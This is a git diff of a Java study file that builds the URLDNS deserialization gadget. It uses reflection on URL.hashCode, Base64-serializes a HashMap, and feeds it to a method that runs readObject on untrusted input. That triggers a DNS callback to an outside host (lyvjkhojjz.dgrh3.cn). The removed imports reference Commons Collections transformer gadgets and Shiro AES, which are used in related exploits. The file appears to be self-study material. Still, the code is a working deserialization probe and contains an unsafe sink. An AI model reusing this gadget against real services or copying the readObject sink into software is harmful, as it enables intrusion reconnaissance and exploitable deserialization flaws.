@@ -1,36 +1,9 @@
-import com.oracle.webservices.internal.api.databinding.DatabindingMode;
-import com.sun.scenario.animation.shared.TimerReceiver;
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InstantiateTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
-import org.apache.commons.collections.map.TransformedMap;
-import org.apache.shiro.crypto.AesCipherService;
-import org.apache.shiro.util.ByteSource;
-import org.jetbrains.annotations.Async;
-
-import javax.xml.ws.soap.Addressing;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.lang.annotation.Target;
-import java.lang.reflect.*;
-import java.net.MalformedURLException;
+import java.io.*;
+import java.lang.reflect.Field;
 import java.net.URL;
+import java.util.Base64;
 import java.util.HashMap;
-import java.util.HashSet;
-import java.util.Map;
 
-/**
- * @BelongsProject: study_java
- * @BelongsPackage: PACKAGE_NAME
- * @Author: Clown
- * @CreateTime: 2023-07-09  11:13
- */
 public class TestClass {
     public static void serialization(Object object)  throws Exception{
         FileOutputStream fileOutputStream = new FileOutputStream("URLDNS.txt");
@@ -38,6 +11,35 @@ public class TestClass {
         objectOutputStream.writeObject(object);
         System.out.println("serialization方法成功执行");
     }
+    public static String serialize(String data) {
+        try {
+            byte[] payload = Base64.getDecoder().decode(data);
+            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(payload);
+            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+            objectInputStream.readObject();
+            return "success";
+        } catch (Exception var5) {
+            return var5.getMessage();
+        }
+    }
+
+    public static String serializeAndPrintBase64(Object object) throws Exception {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(object);
+        objectOutputStream.close();
+
+        byte[] serializedBytes = byteArrayOutputStream.toByteArray();
+
+        // 使用Base64编码字节数组并打印到控制台
+        String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes);
+//        String payload = Arrays.toString(Base64.getDecoder().decode(base64Encoded));
+//        System.out.println(payload);
+        System.out.println("Serialized and Base64 encoded object: " + base64Encoded);
+        return base64Encoded;
+
+    }
+
 
     public static void unserialization() throws Exception{
         FileInputStream fileInputStream = new FileInputStream("URLDNS.txt");
@@ -46,6 +48,22 @@ public class TestClass {
         System.out.println("unserialization执行成功");
     }
 
-    public static void main(String[] args) throws Exception {
+    public static void main(String[] args) throws Exception{
+        HashMap hashMap = new HashMap();
+        URL url = new URL("http://lyvjkhojjz.dgrh3.cn");
+
+        /********反射*******/
+        //将hashCode的值不改为*1
+        Class c = url.getClass();
+//        System.out.println(c);
+        Field hashcodefield = c.getDeclaredField("hashCode");
+        hashcodefield.setAccessible(true);
+        hashcodefield.set(url,1234);//设置hashCode值为1234
+
+        hashMap.put(url,1);
+        hashcodefield.set(url,-1);//设置hashCode值为-1
+//        serialization(hashMap);
+        serialize(serializeAndPrintBase64(hashMap));
+//        unserialization();
     }
 }
